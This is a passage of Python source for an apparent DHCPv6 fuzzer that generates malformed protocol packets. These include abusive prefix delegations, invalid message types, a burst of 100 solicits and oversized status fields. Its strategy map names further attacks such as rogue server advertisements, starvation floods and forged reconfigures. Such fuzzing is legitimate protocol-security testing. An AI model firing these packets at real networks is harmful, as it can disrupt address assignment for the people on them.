    v = random.choice(["slash_zero", "slash_128", "same_iaid", "v4_mapped",
                        "overlap", "mass_pd"])
    if v == "slash_zero":
        opts = _client_id() + _elapsed_time(0) + _ia_pd(sub_opts=_ia_prefix(prefix_len=0))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "slash_128":
        opts = _client_id() + _elapsed_time(0) + _ia_pd(sub_opts=_ia_prefix(prefix_len=128))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "same_iaid":
        iaid = random.randint(1, 0xFFFFFFFF)
        sub1, sub2 = _ia_prefix(prefix_len=48), _ia_prefix(prefix_len=56)
        opts = _client_id() + _elapsed_time(0) + _ia_pd(iaid=iaid, sub_opts=sub1) + _ia_pd(iaid=iaid, sub_opts=sub2)
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "v4_mapped":
        prefix = b"\x00" * 10 + b"\xFF\xFF" + b"\x0A\x00\x00\x00" + b"\x00" * 2
        opts = _client_id() + _elapsed_time(0) + _ia_pd(sub_opts=_ia_prefix(prefix_len=96, prefix=prefix[:16]))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "overlap":
        p1 = bytes([0x20, 0x01, 0x0D, 0xB8, 0x00, 0x01] + [0] * 10)
        p2 = bytes([0x20, 0x01, 0x0D, 0xB8, 0x00, 0x01, 0x00, 0x10] + [0] * 8)
        opts = (_client_id() + _elapsed_time(0) +
                _ia_pd(iaid=1, sub_opts=_ia_prefix(prefix_len=32, prefix=p1)) +
                _ia_pd(iaid=2, sub_opts=_ia_prefix(prefix_len=48, prefix=p2)))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    else:  # mass_pd
        pkts = b""
        for _ in range(100):
            opts = _client_id(_duid_ll()) + _elapsed_time(0) + _ia_pd(sub_opts=_ia_prefix())
            pkts += _dhcpv6_packet(_SOLICIT, options=opts)
        return pkts, 547


# ── Strategy 13: Multi-Protocol Evasion ───────────────────────────────────

def _build_multiprotocol_evasion():
    v = random.choice(["dhcpv4_query", "invalid_msg_type", "starttls_udp",
                        "leasequery_unauth", "relay_client_mix", "msg_type_zero"])
    if v == "dhcpv4_query":
        # DHCPv4-in-DHCPv6 (message type 20, RFC 7341)
        v4_discover = bytes([1, 1, 6, 0]) + struct.pack("!I", random.randint(1, 0xFFFFFFFF))
        v4_discover += b"\x00" * 228 + bytes([99, 130, 83, 99]) + bytes([53, 1, 1, 255])
        opts = _client_id() + _opt(87, v4_discover)  # OPTION_DHCPV4_MSG
        return _dhcpv6_packet(_DHCPV4_QUERY, options=opts), 547
    elif v == "invalid_msg_type":
        pkts = b""
        for mt in [0, 24, 50, 128, 255]:
            opts = _client_id() + _elapsed_time(0)
            pkts += _dhcpv6_packet(mt, options=opts)
        return pkts, 547
    elif v == "starttls_udp":
        # STARTTLS (msg-type 23) on UDP — should only be TCP per RFC 7653
        opts = _client_id() + _elapsed_time(0)
        return _dhcpv6_packet(_STARTTLS, options=opts), 547
    elif v == "leasequery_unauth":
        lq_data = struct.pack("!B", 1) + _random_gua()  # QUERY_BY_ADDRESS
        opts = _client_id() + _opt(44, lq_data)  # OPTION_LQ_QUERY
        return _dhcpv6_packet(_LEASEQUERY, options=opts), 547
    elif v == "relay_client_mix":
        # Client/server header (4B) followed by relay-style options
        opts = (_client_id() + _elapsed_time(0) +
                _opt(_OPT_RELAY_MSG, _dhcpv6_packet(_SOLICIT, options=_client_id())) +
                _opt(_OPT_INTERFACE_ID, b"eth0"))
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    else:  # msg_type_zero
        opts = _client_id() + _elapsed_time(0) + _ia_na()
        return _dhcpv6_packet(0, options=opts), 547


# ── Strategy 14: Elapsed Time / Preference Fuzz ──────────────────────────

def _build_elapsed_time_preference_fuzz():
    v = random.choice(["elapsed_max", "elapsed_zero_non_init", "pref_non_advertise",
                        "multi_elapsed", "status_unknown", "status_oversized"])
    if v == "elapsed_max":
        opts = _client_id() + _elapsed_time(0xFFFF) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "elapsed_zero_non_init":
        opts = _client_id() + _elapsed_time(0) + _server_id() + _ia_na()
        return _dhcpv6_packet(_RENEW, options=opts), 547
    elif v == "pref_non_advertise":
        # Preference option in non-Advertise messages (client shouldn't send)
        opts = _client_id() + _elapsed_time(0) + _opt(_OPT_PREFERENCE, b"\xFF") + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "multi_elapsed":
        opts = _client_id() + _elapsed_time(0) + _elapsed_time(100) + _elapsed_time(0xFFFF) + _ia_na()
        return _dhcpv6_packet(_SOLICIT, options=opts), 547
    elif v == "status_unknown":
        pkts = b""
        for code in [7, 100, 255, 0xFFFF]:
            opts = _server_id() + _client_id() + _status_code(code, b"unknown") + _ia_na()
            pkts += _dhcpv6_packet(_REPLY, options=opts)
        return pkts, 546
    else:  # status_oversized
        msg = bytes([0x41] * 0xFE00)
        opts = _server_id() + _client_id() + _status_code(1, msg)
        return _dhcpv6_packet(_REPLY, options=opts), 546


# ── Strategy dispatch map ─────────────────────────────────────────────────

_STRATEGY_MAP = {
    "rogue_server_advertise":       _build_rogue_server_advertise,
    "duid_identity_attack":         _build_duid_identity_attack,
    "starvation_solicit_flood":     _build_starvation_solicit_flood,
    "option_nested_overflow":       _build_option_nested_overflow,
    "relay_chain_injection":        _build_relay_chain_injection,
    "ia_lifetime_confusion":        _build_ia_lifetime_confusion,
    "state_machine_desync":         _build_state_machine_desync,
    "reconfigure_forge":            _build_reconfigure_forge,
    "dns_option_injection":         _build_dns_option_injection,
    "vendor_class_exploit":         _build_vendor_class_exploit,
    "transaction_id_manipulation":  _build_transaction_id_manipulation,
    "prefix_delegation_abuse":      _build_prefix_delegation_abuse,
    "multiprotocol_evasion":        _build_multiprotocol_evasion,
    "elapsed_time_preference_fuzz": _build_elapsed_time_preference_fuzz,
}


# ── Mutator class ─────────────────────────────────────────────────────────

class Dhcpv6Mutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = DHCPV6_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return DHCPV6_WEIGHTS

    def mutate(self):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_dhcpv6_payload(strategy)
        return payload, strategy, dst_port
